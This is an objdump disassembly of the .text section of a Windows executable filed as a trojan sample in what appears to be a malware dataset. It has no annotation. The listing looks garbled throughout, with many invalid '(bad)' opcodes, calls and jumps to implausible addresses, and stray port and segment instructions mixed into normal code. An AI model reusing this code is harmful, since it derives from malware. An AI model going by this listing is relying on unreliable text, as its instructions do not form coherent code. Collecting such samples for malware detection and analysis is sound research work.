
malware_samples/trojan/9627fdff5f980d069a4e98726c468c5b75297551392a6cd38bf95078d68f75c1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b c1                	mov    %ecx,%eax
  401003:	81 ec be 04 00 00    	sub    $0x4be,%esp
  401009:	b8 d4 02 41 00       	mov    $0x4102d4,%eax
  40100e:	8f                   	(bad)
  40100f:	56                   	push   %esi
  401010:	a3 e8 f3 41 5d       	mov    %eax,0x5d41f3e8
  401015:	30 a8 22 41 f0 96    	xor    %ch,-0x690fbede(%eax)
  40101b:	08 40 41             	or     %al,0x41(%eax)
  40101e:	00 a3 04 18 41 00    	add    %ah,0x411804(%ebx)
  401024:	33 db                	xor    %ebx,%ebx
  401026:	a3 48 40 09 00       	mov    %eax,0x94048
  40102b:	92                   	xchg   %eax,%edx
  40102c:	8d 45 0c             	lea    0xc(%ebp),%eax
  40102f:	53                   	push   %ebx
  401030:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401033:	50                   	push   %eax
  401034:	51                   	push   %ecx
  401035:	c7 05 f0 a9 41 00 44 	movl   $0x3640d244,0x41a9f0
  40103c:	d2 40 36 
  40103f:	88 1d 40 3c 41 00    	mov    %bl,0x413c40
  401045:	44                   	inc    %esp
  401046:	d6                   	salc
  401047:	4c                   	dec    %esp
  401048:	00 3c 68             	add    %bh,(%eax,%ebp,2)
  40104b:	16                   	push   %ss
  40104c:	ec                   	in     (%dx),%al
  40104d:	40                   	inc    %eax
  40104e:	00 e8                	add    %ch,%al
  401050:	eb a4                	jmp    0x400ff6
  401052:	b7 00                	mov    $0x0,%bh
  401054:	83 c4 04             	add    $0x4,%esp
  401057:	53                   	push   %ebx
  401058:	53                   	push   %ebx
  401059:	53                   	push   %ebx
  40105a:	68 4c 35 41 00       	push   $0x41354c
  40105f:	e8 fc 3e 17 00       	call   0x574f60
  401064:	8b 55 0c             	mov    0xc(%ebp),%edx
  401067:	af                   	scas   %es:(%edi),%eax
  401068:	45                   	inc    %ebp
  401069:	08 8b 0d 4c d4 89    	or     %cl,-0x762bb3f3(%ebx)
  40106f:	00 52 e2             	add    %dl,-0x1e(%edx)
  401072:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401075:	51                   	push   %ecx
  401076:	52                   	push   %edx
  401077:	8e 44 3c 00          	mov    0x0(%esp,%edi,1),%es
  40107b:	00 8b 80 f4 8d 45    	add    %cl,0x458df480(%ebx)
  401081:	26 8d 4d a4          	lea    %es:-0x5c(%ebp),%ecx
  401085:	8e 97 68 c2 98 40    	mov    0x4098c268(%edi),%ss
  40108b:	8a 52 12             	mov    0x12(%edx),%dl
  40108e:	de 4a 00             	fimuls 0x0(%edx)
  401091:	91                   	xchg   %eax,%ecx
  401092:	85 c0                	test   %eax,%eax
  401094:	0f 85 9a 04 00 00    	jne    0x401534
  40109a:	8b 1d 3c c1 40 00    	mov    0x40c13c,%ebx
  4010a0:	0f be 45 fb          	movsbl -0x5(%ebp),%eax
  4010a4:	83 c0 bf             	add    $0xffffffbf,%eax
  4010a7:	83 f8 be             	cmp    $0xffffffbe,%eax
  4010aa:	b5 87                	mov    $0x87,%ch
  4010ac:	66 bb 00 40          	mov    $0x4000,%bx
  4010b0:	33 bc 8a 40 08 9e 40 	xor    0x409e0840(%edx,%ecx,4),%edi
  4010b7:	00 ff                	add    %bh,%bh
  4010b9:	24 8d                	and    $0x8d,%al
  4010bb:	f8                   	clc
  4010bc:	16                   	push   %ss
  4010bd:	40                   	inc    %eax
  4010be:	00 8b 55 92 52 ff    	add    %cl,-0xad6dab(%ebx)
  4010c4:	15 6c fd 40 00       	adc    $0x40fd6c,%eax
  4010c9:	83 c4 04             	add    $0x4,%esp
  4010cc:	3b 62 a3             	cmp    -0x5d(%edx),%esp
  4010cf:	10 d0                	adc    %dl,%al
  4010d1:	3a 8f 0f 8f e1 04    	cmp    0x4e18f0f(%edi),%cl
  4010d7:	8d 00                	lea    (%eax),%eax
  4010d9:	68 f8 d1 40 00       	push   $0x40d1f8
  4010de:	e8 6d 06 00 e1       	call   0xe1401750
  4010e3:	e9 2b 88 00 00       	jmp    0x409913
  4010e8:	c2 05 8e             	ret    $0x8e05
  4010eb:	02 41 b2             	add    -0x4e(%ecx),%al
  4010ee:	01 c8                	add    %ecx,%eax
  4010f0:	d4 6e                	aam    $0x6e
  4010f2:	e9 1f 04 00 00       	jmp    0x401516
  4010f7:	89 1d 14 53 40 a2    	mov    %ebx,0xa2405314
  4010fd:	e9 14 04 00 00       	jmp    0x401516
  401102:	81 45 fc 50 2d 15 6c 	addl   $0x6c152d50,-0x4(%ebp)
  401109:	c1 0b 00             	rorl   $0x0,(%ebx)
  40110c:	a3 18 d0 40 00       	mov    %eax,0x40d018
  401111:	e9 fd b0 00 00       	jmp    0x40c213
  401116:	8b 34 fc             	mov    (%esp,%edi,8),%esi
  401119:	51                   	push   %ecx
  40111a:	ff 91 6c c1 40 00    	call   *0x40c16c(%ecx)
  401120:	a3 6c 02 41 00       	mov    %eax,0x41026c
  401125:	e9 e9 03 00 00       	jmp    0x401513
  40112a:	5a                   	pop    %edx
  40112b:	1d ec 02 41 00       	sbb    $0x4102ec,%eax
  401130:	7e c4                	jle    0x4010f6
  401132:	68 d8 d1 03 00       	push   $0x3d1d8
  401137:	3b 14 06             	cmp    (%esi,%eax,1),%edx
  40113a:	00 bf 83 c4 04 c7    	add    %bh,-0x38fb3b7d(%edi)
  401140:	05 26 02 67 0c       	add    $0xc670226,%eax
  401145:	ff                   	(bad)
  401146:	ff 9a ff c4 c8 06    	lcall  *0x6c8c4ff(%edx)
  40114c:	31 00                	xor    %eax,(%eax)
  40114e:	8b 55 75             	mov    0x75(%ebp),%edx
  401151:	52                   	push   %edx
  401152:	ff 15 88 c1 0e 00    	call   *0xec188
  401158:	a3 12 0b 41 a5       	mov    %eax,0xa5410b12
  40115d:	e9 b1 03 00 00       	jmp    0x401513
  401162:	89 ab 00 d0 40 00    	mov    %ebp,0x40d000(%ebx)
  401168:	e9 a9 03 7f 00       	jmp    0xbf1516
  40116d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401170:	50                   	push   %eax
  401171:	6a ea                	push   $0xffffffea
  401173:	88 38                	mov    %bh,(%eax)
  401175:	40                   	inc    %eax
  401176:	00 e5                	add    %ah,%ch
  401178:	e0 85                	loopne 0x4010ff
  40117a:	12 00                	adc    (%eax),%al
  40117c:	e9 92 0b 00 00       	jmp    0x401d13
  401181:	1f                   	pop    %ds
  401182:	1d 20 24 40 10       	sbb    $0x10402420,%eax
  401187:	e9 8a 03 00 00       	jmp    0x401516
  40118c:	39 ec                	cmp    %ebp,%esp
  40118e:	60                   	pusha
  40118f:	02 41 00             	add    0x0(%ecx),%al
  401192:	74 0d                	je     0x4011a1
  401194:	68 58 d1 40 17       	push   $0x1740d158
  401199:	8b b2 05 00 00 83    	mov    -0x7cfffffb(%edx),%esi
  40119f:	43                   	inc    %ebx
  4011a0:	04 8b                	add    $0x8b,%al
  4011a2:	4d                   	dec    %ebp
  4011a3:	66 51                	push   %cx
  4011a5:	b2 d8                	mov    $0xd8,%dl
  4011a7:	9f                   	lahf
  4011a8:	00 00                	add    %al,(%eax)
  4011aa:	56                   	push   %esi
  4011ab:	c4 04 3b             	les    (%ebx,%edi,1),%eax
  4011ae:	a2 49 e2 c7 3d       	mov    %al,0x3dc7e249
  4011b3:	60                   	pusha
  4011b4:	02 41 5e             	add    0x5e(%ecx),%al
  4011b7:	01 00                	add    %eax,(%eax)
  4011b9:	71 00                	jno    0x4011bb
  4011bb:	e9 56 03 00 00       	jmp    0x401516
  4011c0:	39 18                	cmp    %ebx,(%eax)
  4011c2:	20 38                	and    %bh,(%eax)
  4011c4:	41                   	inc    %ecx
  4011c5:	00 0f                	add    %cl,(%edi)
  4011c7:	84 2f                	test   %ch,(%edi)
  4011c9:	03 a4 3b 50 ff 15 28 	add    0x2815ff50(%ebx,%edi,1),%esp
  4011d0:	c1 40 00 39          	roll   $0x39,0x0(%eax)
  4011d4:	ca 96 02             	lret   $0x296
  4011d7:	41                   	inc    %ecx
  4011d8:	00 74 0d 68          	add    %dh,0x68(%ebp,%ecx,1)
  4011dc:	a0 69 40 00 e8       	mov    0xe8004069,%al
  4011e1:	67 05 00 00 f1 c4    	addr16 add $0xc4f10000,%eax
  4011e7:	04 8b                	add    $0x8b,%al
  4011e9:	55                   	push   %ebp
  4011ea:	fc                   	cld
  4011eb:	53                   	push   %ebx
  4011ec:	02 3f                	add    (%edi),%bh
  4011ee:	35 00 cf 83 c4       	xor    $0xc483cf00,%eax
  4011f3:	04 3b                	add    $0x3b,%al
  4011f5:	c3                   	ret
  4011f6:	75 0f                	jne    0x401207
  4011f8:	b0 71                	mov    $0x71,%al
  4011fa:	60                   	pusha
  4011fb:	02 41 b5             	add    -0x4b(%ecx),%al
  4011fe:	da 7b 00             	fidivrl 0x0(%ebx)
  401201:	97                   	xchg   %eax,%edi
  401202:	e9 44 03 9f 00       	jmp    0xdf154b
  401207:	39 1d 20 38 41 00    	cmp    %ebx,0x413820
  40120d:	0f 84 03 03 00 00    	je     0x401516
  401213:	f8                   	clc
  401214:	ff 15 fc 03 40 00    	call   *0x4003fc
  40121a:	c7 05 5c b9 aa 00 01 	movl   $0xc40001,0xaab95c
  401221:	00 c4 00 
  401224:	e9 ed 02 00 00       	jmp    0x401516
  401229:	8b d8                	mov    %eax,%ebx
  40122b:	fc                   	cld
  40122c:	50                   	push   %eax
  40122d:	ff 15 6c c1 40 00    	call   *0x40c16c
  401233:	a3 1f 02 41 00       	mov    %eax,0x41021f
  401238:	2d 65 02 00 00       	sub    $0x265,%eax
  40123d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401240:	51                   	push   %ecx
  401241:	bb f3 6c c1 40       	mov    $0x40c16cf3,%ebx
  401246:	00 a3 00 02 41 00    	add    %ah,0x410200(%ebx)
  40124c:	c6                   	(bad)
  40124d:	9d                   	popf
  40124e:	10 d0                	adc    %dl,%al
  401250:	40                   	inc    %eax
  401251:	00 50 c3             	add    %dl,-0x3d(%eax)
  401254:	00 00                	add    %al,(%eax)
  401256:	e9 b8 02 00 00       	jmp    0x401513
  40125b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40125e:	ba 40 38 0e 00       	mov    $0xe3840,%edx
  401263:	2b fc                	sub    %esp,%edi
  401265:	8a 08                	mov    (%eax),%cl
  401267:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  40126a:	40                   	inc    %eax
  40126b:	3a cb                	cmp    %bl,%cl
  40126d:	75 c7                	jne    0x401236
  40126f:	e9 a2 02 e6 7d       	jmp    0x7e261516
  401274:	8b 55 f6             	mov    -0xa(%ebp),%edx
  401277:	a1 cc 40 48 00       	mov    0x4840cc,%eax
  40127c:	53                   	push   %ebx
  40127d:	68 a0 d1 40 00       	push   $0x40d1a0
  401282:	52                   	push   %edx
  401283:	f2 38 d1             	repnz cmp %dl,%cl
  401286:	7b 00                	jnp    0x401288
  401288:	50                   	push   %eax
  401289:	e8 02 f9 00 00       	call   0x410b90
  40128e:	83 c4 14             	add    $0x14,%esp
  401291:	a3 44 40 d6 00       	mov    %eax,0xd64044
  401296:	9e                   	sahf
  401297:	7b 02                	jnp    0x40129b
  401299:	00 2f                	add    %ch,(%edi)
  40129b:	f0 0e                	lock push %cs
  40129d:	fc                   	cld
  40129e:	8b db                	mov    %ebx,%ebx
  4012a0:	31 c1                	xor    %eax,%ecx
  4012a2:	40                   	inc    %eax
  4012a3:	00 83 39 01 7e 11    	add    %al,0x117e0139(%ebx)
  4012a9:	9e                   	sahf
  4012aa:	d2 6a 08             	shrb   %cl,0x8(%edx)
  4012ad:	24 0b                	and    $0xb,%al
  4012af:	52                   	push   %edx
  4012b0:	c2 8d 8b             	ret    $0x8b8d
  4012b3:	7d fc                	jge    0x4012b1
  4012b5:	6a c4                	push   $0xffffffc4
  4012b7:	08 eb                	or     %ch,%bl
  4012b9:	12 d0                	adc    %al,%dl
  4012bb:	0d 78 fe 40 00       	or     $0x40fe78,%eax
  4012c0:	33 c0                	xor    %eax,%eax
  4012c2:	ec                   	in     (%dx),%al
  4012c3:	07                   	pop    %es
  4012c4:	8b 11                	mov    (%ecx),%edx
  4012c6:	8a 07                	mov    (%edi),%al
  4012c8:	42                   	inc    %edx
  4012c9:	83 e0 08             	and    $0x8,%eax
  4012cc:	3b a2 74 25 47 89    	cmp    -0x76b8da8c(%edx),%esp
  4012d2:	71 fc                	jno    0x4012d0
  4012d4:	d9 c8                	fxch   %st(0)
  4012d6:	83 9e ff fb c0 f2 41 	sbbl   $0x41,-0xd3f0401(%esi)
  4012dd:	f7 d1                	not    %ecx
  4012df:	49                   	dec    %ecx
  4012e0:	51                   	push   %ecx
  4012e1:	e8 ca a0 00 97       	call   0x9740b3b0
  4012e6:	e2 00                	loop   0x4012e8
  4012e8:	4e                   	dec    %esi
  4012e9:	00 00                	add    %al,(%eax)
  4012eb:	91                   	xchg   %eax,%ecx
  4012ec:	0d e2 68 d1 8b       	or     $0x8bd168e2,%eax
  4012f1:	65 e8 59 04 00 bb    	gs call 0xbb401750
  4012f7:	83 c4 04             	add    $0x4,%esp
  4012fa:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4012fd:	ad                   	lods   %ds:(%esi),%eax
  4012fe:	c9                   	leave
  4012ff:	e3 d7                	jecxz  0x4012d8
  401301:	fa                   	cli
  401302:	33 c0                	xor    %eax,%eax
  401304:	f2 ae                	repnz scas %es:(%edi),%al
  401306:	f7 d1                	not    %ecx
  401308:	49                   	dec    %ecx
  401309:	8d 85 f4 fb ff ff    	lea    -0x40c(%ebp),%eax
  40130f:	51                   	push   %ecx
  401310:	52                   	push   %edx
  401311:	4f                   	dec    %edi
  401312:	e8 c9 a0 00 00       	call   0x40b3e0
  401317:	53                   	push   %ebx
  401318:	8d 8d a6 fb ff 91    	lea    -0x6e00045a(%ebp),%ecx
  40131e:	68 9c d1 2a 00       	push   $0x2ad19c
  401323:	51                   	push   %ecx
  401324:	68 50 1c 40 00       	push   $0x401c50
  401329:	e9 8e 00 00 00       	jmp    0x4013bc
  40132e:	8b 7d b0             	mov    -0x50(%ebp),%edi
  401331:	8b 0d 74 f6 40 00    	mov    0x40f674,%ecx
  401337:	2d 39 01 7e 11       	sub    $0x117e0139,%eax
  40133c:	33 d2                	xor    %edx,%edx
  40133e:	6a 08                	push   $0x8
  401340:	8a 17                	mov    (%edi),%dl
  401342:	6f                   	outsl  %ds:(%esi),(%dx)
  401343:	ff d6                	call   *%esi
  401345:	af                   	scas   %es:(%edi),%eax
  401346:	7d 61                	jge    0x4013a9
  401348:	83 c4 08             	add    $0x8,%esp
  40134b:	86 7b 8b             	xchg   %bh,-0x75(%ebx)
  40134e:	0d 7d c1 40 00       	or     $0x40c17d,%eax
  401353:	5c                   	pop    %esp
  401354:	c0 2d 07 8b 07 8a 04 	shrb   $0x4,0x8a078b07
  40135b:	42                   	inc    %edx
  40135c:	83 da 08             	sbb    $0x8,%edx
  40135f:	3b c3                	cmp    %ebx,%eax
  401361:	74 06                	je     0x401369
  401363:	47                   	inc    %edi
  401364:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401367:	eb c8                	jmp    0x401331
  401369:	83 a0 ff 33 c0 a1 ae 	andl   $0xffffffae,-0x5e3fcc01(%eax)
  401370:	f7 73 49             	divl   0x49(%ebx)
  401373:	51                   	push   %ecx
  401374:	71 37                	jno    0x4013ad
  401376:	85 00                	test   %eax,(%eax)
  401378:	00 3d 00 04 b8 00    	add    %bh,0xb80400
  40137e:	76 0d                	jbe    0x40138d
  401380:	68 34 d1 40 00       	push   $0x40d134
  401385:	e8 c6 03 ff 00       	call   0x13f1750
  40138a:	83 c4 04             	add    $0x4,%esp
  40138d:	ec                   	in     (%dx),%al
  40138e:	55                   	push   %ebp
  40138f:	fc                   	cld
  401390:	83 c9 94             	or     $0xffffff94,%ecx
  401393:	72 fa                	jb     0x40138f
  401395:	33 c0                	xor    %eax,%eax
  401397:	f2 ae                	repnz scas %es:(%edi),%al
  401399:	cc                   	int3
  40139a:	d1 49 8d             	rorl   $1,-0x73(%ecx)
  40139d:	85 f4                	test   %esi,%esp
  40139f:	90                   	nop
  4013a0:	0b ff                	or     %edi,%edi
  4013a2:	51                   	push   %ecx
  4013a3:	52                   	push   %edx
  4013a4:	50                   	push   %eax
  4013a5:	e8 36 04 00 00       	call   0x4017e0
  4013aa:	53                   	push   %ebx
  4013ab:	db 8d f4 fb ff ff    	fisttpl -0x40c(%ebp)
  4013b1:	68 82 d1 40 00       	push   $0x40d182
  4013b6:	51                   	push   %ecx
  4013b7:	68 18 d1 f7 00       	push   $0xf7d118
  4013bc:	8b 15 96 18 41 00    	mov    0x411896,%edx
  4013c2:	88 9c 2e f4 fb ff ff 	mov    %bl,-0x40c(%esi,%ebp,1)
  4013c9:	a1 79 68 41 6c       	mov    0x6c416879,%eax
  4013ce:	11 50 e8             	adc    %edx,-0x18(%eax)
  4013d1:	bb 44 00 8f 83       	mov    $0x838f0044,%ebx
  4013d6:	15 63 cf 4f c3       	adc    $0xc34fcf63,%eax
  4013db:	41                   	inc    %ecx
  4013dc:	00 e9                	add    %ch,%cl
  4013de:	11 01                	adc    %eax,(%ecx)
  4013e0:	c4                   	(bad)
  4013e1:	d2 8a 4d fc 8b 63    	rorb   %cl,0x638bfc4d(%edx)
  4013e7:	48                   	dec    %eax
  4013e8:	40                   	inc    %eax
  4013e9:	41                   	inc    %ecx
  4013ea:	25 a1 4c 76 41       	and    $0x41764ca1,%eax
  4013ef:	00 ee                	add    %ch,%dh
  4013f1:	2c 92                	sub    $0x92,%al
  4013f3:	d1 40 00             	roll   $1,0x0(%eax)
  4013f6:	51                   	push   %ecx
  4013f7:	50                   	push   %eax
  4013f8:	50                   	push   %eax
  4013f9:	e8 92 44 00 00       	call   0x405890
  4013fe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401401:	8b 3d 8c c1 40 00    	mov    0x40c18c,%edi
  401407:	6a 05                	push   $0x5
  401409:	68 10 d1 40 00       	push   $0x40d110
  40140e:	51                   	push   %ecx
  40140f:	a3 48 40 7b 00       	mov    %eax,0x7b4048
  401414:	c5 d7 83             	(bad)
  401417:	c4 20                	les    (%eax),%esp
  401419:	85 c0                	test   %eax,%eax
  40141b:	75 40                	jne    0x40145d
  40141d:	c7 05 00 3d 41 00 01 	movl   $0x8a000001,0x413d00
  401424:	00 00 8a 
  401427:	e9 ea 00 00 39       	jmp    0x39401516
  40142c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40142f:	c6 07 68             	movb   $0x68,(%edi)
  401432:	08 d1                	or     %dl,%cl
  401434:	40                   	inc    %eax
  401435:	00 52 ff             	add    %dl,-0x1(%edx)
  401438:	d7                   	xlat   %ds:(%ebx)
  401439:	83 c4 0c             	add    $0xc,%esp
  40143c:	85 e7                	test   %esp,%edi
  40143e:	75 0f                	jne    0x40144f
  401440:	e6 05                	out    %al,$0x5
  401442:	84 02                	test   %al,(%edx)
  401444:	41                   	inc    %ecx
  401445:	00 01                	add    %al,(%ecx)
  401447:	00 00                	add    %al,(%eax)
  401449:	00 e9                	add    %ch,%cl
  40144b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40144c:	00 00                	add    %al,(%eax)
  40144e:	00 8b 45 fc 6a c2    	add    %cl,-0x3d9503bb(%ebx)
  401454:	81 fc d0 40 00 c1    	cmp    $0xc10040d0,%esp
  40145a:	82 d7 21             	adc    $0x21,%bh
  40145d:	c4 0c 31             	les    (%ecx,%esi,1),%ecx
  401460:	c0 0f 85             	rorb   $0x85,(%edi)
  401463:	af                   	scas   %es:(%edi),%eax
  401464:	00 00                	add    %al,(%eax)
  401466:	00 c7                	add    %al,%bh
  401468:	05 bb 02 41 20       	add    $0x204102bb,%eax
  40146d:	01 00                	add    %eax,(%eax)
  40146f:	00 00                	add    %al,(%eax)
  401471:	e9 a0 38 00 00       	jmp    0x404d16
  401476:	f6 0c 88 02          	testb  $0x2,(%eax,%ecx,4)
  40147a:	41                   	inc    %ecx
  40147b:	61                   	popa
  40147c:	34 00                	xor    $0x0,%al
  40147e:	00 00                	add    %al,(%eax)
  401480:	e9 91 00 00 00       	jmp    0x401516
  401485:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  401488:	c7 05 88 02 41 00 01 	movl   $0xc2009b01,0x410288
  40148f:	9b 00 c2 
  401492:	be 0d e8 17 41       	mov    $0x4117e80d,%esi
  401497:	e4 eb                	in     $0xeb,%al
  401499:	7c 8b                	jl     0x401426
  40149b:	55                   	push   %ebp
  40149c:	fc                   	cld
  40149d:	6a 3a                	push   $0x3a
  40149f:	52                   	push   %edx
  4014a0:	ff c9                	dec    %ecx
  4014a2:	5f                   	pop    %edi
  4014a3:	c1 40 00 83          	roll   $0x83,0x0(%eax)
  4014a7:	c4 08                	les    (%eax),%ecx
  4014a9:	55                   	push   %ebp
  4014aa:	d4 74                	aam    $0x74
  4014ac:	3e 27                	ds daa
  4014ae:	18 40 50             	sbb    %al,0x50(%eax)
  4014b1:	ff 15 6c c1 40 00    	call   *0x40c16c
  4014b7:	83 f9 04             	cmp    $0x4,%ecx
  4014ba:	a3 74 02 15 94       	mov    %eax,0x94150274
  4014bf:	8b 45 a3             	mov    -0x5d(%ebp),%eax
  4014c2:	ba 40 3c 7b 00       	mov    $0x7b3c40,%edx
  4014c7:	c0 d0 8a             	rcl    $0x8a,%al
  4014ca:	08 88 0c 02 40 6d    	or     %cl,0x6d40020c(%eax)
  4014d0:	2d 75 f6 c7 05       	sub    $0x5c7f675,%eax
  4014d5:	5d                   	pop    %ebp
  4014d6:	02 41 00             	add    0x0(%ecx),%al
  4014d9:	01 da                	add    %ebx,%edx
  4014db:	00 5e eb             	add    %bl,-0x15(%esi)
  4014de:	37                   	aaa
  4014df:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4014e2:	c7 05 88 02 41 00 bf 	movl   $0xbf,0x410288
  4014e9:	00 00 00 
  4014ec:	55                   	push   %ebp
  4014ed:	a8 0b                	test   $0xb,%al
  4014ef:	41                   	inc    %ecx
  4014f0:	f3 eb 23             	repz jmp 0x401516
  4014f3:	8b 4d 0b             	mov    0xb(%ebp),%ecx
  4014f6:	c7 05 88 02 41 80 01 	movl   $0x300001,0x80410288
  4014fd:	00 30 00 
  401500:	89 0d f0 17 41 00    	mov    %ecx,0x4117f0
  401506:	eb 4d                	jmp    0x401555
  401508:	8b 55 0c             	mov    0xc(%ebp),%edx
  40150b:	8b 02                	mov    (%edx),%eax
  40150d:	6d                   	insl   (%dx),%es:(%edi)
  40150e:	e8 fd 2d 00 bb       	call   0xbb404310
  401513:	83 c4 7e             	add    $0x7e,%esp
  401516:	8b 45 24             	mov    0x24(%ebp),%eax
  401519:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40151c:	8d 55 fb             	lea    -0x5(%ebp),%edx
  40151f:	51                   	push   %ecx
  401520:	52                   	push   %edx
  401521:	04 14                	add    $0x14,%al
  401523:	ed                   	in     (%dx),%eax
  401524:	40                   	inc    %eax
  401525:	f0 50                	lock push %eax
  401527:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401528:	44                   	inc    %esp
  401529:	46                   	inc    %esi
  40152a:	00 00                	add    %al,(%eax)
  40152c:	85 56 0f             	test   %edx,0xf(%esi)
  40152f:	84 e2                	test   %ah,%dl
  401531:	fb                   	sti
  401532:	ff                   	(bad)
  401533:	ff 8f 45 f4 8b 4d    	decl   0x4d8bf445(%edi)
  401539:	08 8b 35 f3 c1 8e    	or     %cl,-0x713e0ccb(%ebx)
  40153f:	00 49 39             	add    %cl,0x39(%ecx)
  401542:	49                   	dec    %ecx
  401543:	db 74 28 19          	(bad) 0x19(%eax,%ebp,1)
  401547:	55                   	push   %ebp
  401548:	c0 8b 0d 31 c0 40 00 	rorb   $0x0,0x40c0310d(%ebx)
  40154f:	83 c1 40             	add    $0x40,%ecx
  401552:	8b 02                	mov    (%edx),%eax
  401554:	50                   	push   %eax
  401555:	68 dc 5d 40 00       	push   $0x405ddc
  40155a:	51                   	push   %ecx
  40155b:	ad                   	lods   %ds:(%esi),%eax
  40155c:	d6                   	salc
  40155d:	23 55 f8             	and    -0x8(%ebp),%edx
  401560:	8b 02                	mov    (%edx),%eax
  401562:	50                   	push   %eax
  401563:	e8 a8 89 00 00       	call   0x409f10
  401568:	8b 45 33             	mov    0x33(%ebp),%eax
  40156b:	83 c4 10             	add    $0x10,%esp
  40156e:	8b 18                	mov    (%eax),%ebx
  401570:	f9                   	stc
  401571:	8b 50 1c             	mov    0x1c(%eax),%edx
  401574:	8b 14 cf             	mov    (%edi,%ecx,8),%edx
  401577:	41                   	inc    %ecx
  401578:	89 48 0c             	mov    %ecx,0xc(%eax)
  40157b:	a1 4c 40 41 00       	mov    0x41404c,%eax
  401580:	52                   	push   %edx
  401581:	50                   	push   %eax
  401582:	e8 c9 42 e8 00       	call   0x1285850
  401587:	83 e8 d3             	sub    $0xffffffd3,%eax
  40158a:	2f                   	das
  40158b:	00 00                	add    %al,(%eax)
  40158d:	0f ec 28             	paddsb (%eax),%mm5
  401590:	85 c0                	test   %eax,%eax
  401592:	d7                   	xlat   %ds:(%ebx)
  401593:	24 ca                	and    $0xca,%al
  401595:	6f                   	outsl  %ds:(%esi),(%dx)
  401596:	0c a1                	or     $0xa1,%al
  401598:	c8 fe 40 00          	enter  $0x40fe,$0x0
  40159c:	83 c0 fc             	add    $0xfffffffc,%eax
  40159f:	97                   	xchg   %eax,%edi
  4015a0:	11 52 68             	adc    %edx,0x68(%edx)
  4015a3:	c8 d0 40 00          	enter  $0x40d0,$0x0
  4015a7:	50                   	push   %eax
  4015a8:	8a d6                	mov    %dh,%dl
  4015aa:	6d                   	insl   (%dx),%es:(%edi)
  4015ab:	4d                   	dec    %ebp
  4015ac:	0c 8b                	or     $0x8b,%al
  4015ae:	11 52 e8             	adc    %edx,-0x18(%edx)
  4015b1:	fc                   	cld
  4015b2:	2d 17 00 83 c4       	sub    $0xc4830017,%eax
  4015b7:	10 7a 18             	adc    %bh,0x18(%edx)
  4015ba:	d0 40 00             	rolb   $1,0x0(%eax)
  4015bd:	3b c3                	cmp    %ebx,%eax
  4015bf:	7c 07                	jl     0x4015c8
  4015c1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4015c2:	5a                   	pop    %edx
  4015c3:	4e                   	dec    %esi
  4015c4:	00 00                	add    %al,(%eax)
  4015c6:	7f 23                	jg     0x4015eb
  4015c8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4015cb:	8b 89 c8 c0 40 00    	mov    0x40c0c8(%ecx),%ecx
  4015d1:	68 79 4e 00 00       	push   $0x4e79
  4015d6:	e4 c2                	in     $0xc2,%al
  4015d8:	13 8b 93 51 a3 a0    	adc    -0x5f5cae6d(%ebx),%ecx
  4015de:	d0 40 ff             	rolb   $1,-0x1(%eax)
  4015e1:	52                   	push   %edx
  4015e2:	ff 34 8b             	push   (%ebx,%ecx,4)
  4015e5:	c9                   	leave
  4015e6:	0c 8b                	or     $0x8b,%al
  4015e8:	08 51 e5             	or     %dl,-0x1b(%ecx)
  4015eb:	21 2d 00 00 c5 18    	and    %ebp,0x18c50000
  4015f1:	b9 7a 96 83 c4       	mov    $0xc483967a,%ecx
  4015f6:	14 bd                	adc    $0xbd,%al
  4015f8:	80 10 b6             	adcb   $0xb6,(%eax)
  4015fb:	83 f6 3b             	xor    $0x3b,%esi
  4015fe:	c1 7e 93 8b          	sarl   $0x8b,-0x6d(%esi)
  401602:	55                   	push   %ebp
  401603:	0c 8b                	or     $0x8b,%al
  401605:	0d c8 c0 40 00       	or     $0x40c0c8,%eax
  40160a:	5d                   	pop    %ebp
  40160b:	c1 40 8b 02          	roll   $0x2,-0x75(%eax)
  40160f:	a9 68 58 d0 40       	test   $0x40d05868,%eax
  401614:	00 51 92             	add    %dl,-0x6e(%ecx)
  401617:	d6                   	salc
  401618:	8b 55 0c             	mov    0xc(%ebp),%edx
  40161b:	8b 02                	mov    (%edx),%eax
  40161d:	50                   	push   %eax
  40161e:	e8 ed 2c 00 00       	call   0x404310
  401623:	1a 0d 10 d0 96 00    	sbb    0x96d010,%cl
  401629:	83 c4 10             	add    $0x10,%esp
  40162c:	39 1d d6 2c 3b 00    	cmp    %ebx,0x3b2cd6
  401632:	74 3e                	je     0x401672
  401634:	81 f9 96 00 00 00    	cmp    $0x96,%ecx
  40163a:	ab                   	stos   %eax,%es:(%edi)
  40163b:	36 b8 67 66 73 66    	ss mov $0x66736667,%eax
  401641:	f7 e9                	imul   %ecx
  401643:	cd cc                	int    $0xcc
  401645:	02 8b ca c1 e9 1f    	add    0x1fe9c1ca(%ebx),%cl
  40164b:	03 d1                	add    %ecx,%edx
  40164d:	83 fa 64             	cmp    $0x64,%edx
  401650:	89 15 bb d0 40 00    	mov    %edx,0x40d0bb
  401656:	d1 20                	shll   $1,(%eax)
  401658:	d2 55 14             	rclb   %cl,0x14(%ebp)
  40165b:	d0 40 00             	rolb   $1,0x0(%eax)
  40165e:	64 00 00             	add    %al,%fs:(%eax)
  401661:	61                   	popa
  401662:	eb 14                	jmp    0x401678
  401664:	e8 37 2c 00 00       	call   0x4042a0
  401669:	5f                   	pop    %edi
  40166a:	5e                   	pop    %esi
  40166b:	33 b2 5b 8b e5 43    	xor    0x43e58b5b(%edx),%esi
  401671:	44                   	inc    %esp
  401672:	89 1d 14 d0 40 00    	mov    %ebx,0x40d014
  401678:	e8 23 2c 00 00       	call   0x4042a0
  40167d:	e8 0e 01 00 00       	call   0x401790
  401682:	88 15 59 40 41 00    	mov    %dl,0x414059
